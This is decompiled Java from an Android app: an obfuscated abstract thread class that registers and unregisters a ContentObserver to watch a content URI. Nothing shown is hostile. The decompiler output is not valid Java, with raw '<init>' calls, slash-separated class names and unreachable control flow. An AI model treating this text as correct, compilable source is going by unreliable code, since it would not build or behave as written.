package com.vvt.i;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;

public abstract class a
  extends Thread
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private ContentResolver c;
  private ContentObserver d;
  private boolean e = false;
  
  public a(ContentResolver paramContentResolver)
  {
    this.c = paramContentResolver;
  }
  
  private void f()
  {
    b localb = new com/vvt/i/b;
    Handler localHandler = new android/os/Handler;
    localHandler.<init>();
    localb.<init>(this, localHandler);
    this.d = localb;
  }
  
  protected abstract Uri a();
  
  protected abstract void b();
  
  public void c()
  {
    boolean bool1 = true;
    boolean bool2 = isAlive();
    if (!bool2) {
      start();
    }
    for (;;)
    {
      return;
      bool2 = this.e;
      if (!bool2)
      {
        localObject = this.c;
        if (localObject == null) {
          break;
        }
        localObject = this.d;
        if (localObject == null) {
          break;
        }
        localObject = this.c;
        Uri localUri = a();
        ContentObserver localContentObserver = this.d;
        ((ContentResolver)localObject).registerContentObserver(localUri, bool1, localContentObserver);
        this.e = bool1;
        bool2 = a;
        if (!bool2) {}
      }
    }
    bool2 = b;
    if (bool2) {}
    Object localObject = new java/lang/RuntimeException;
    ((RuntimeException)localObject).<init>("Observer registration failed!!");
    throw ((Throwable)localObject);
  }
  
  public void d()
  {
    ContentResolver localContentResolver = this.c;
    if (localContentResolver != null)
    {
      boolean bool = this.e;
      if (bool)
      {
        localContentResolver = this.c;
        ContentObserver localContentObserver = this.d;
        localContentResolver.unregisterContentObserver(localContentObserver);
        localContentResolver = null;
        this.e = false;
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  public boolean e()
  {
    return this.e;
  }
  
  public void run()
  {
    Looper.prepare();
    f();
    c();
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/i/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */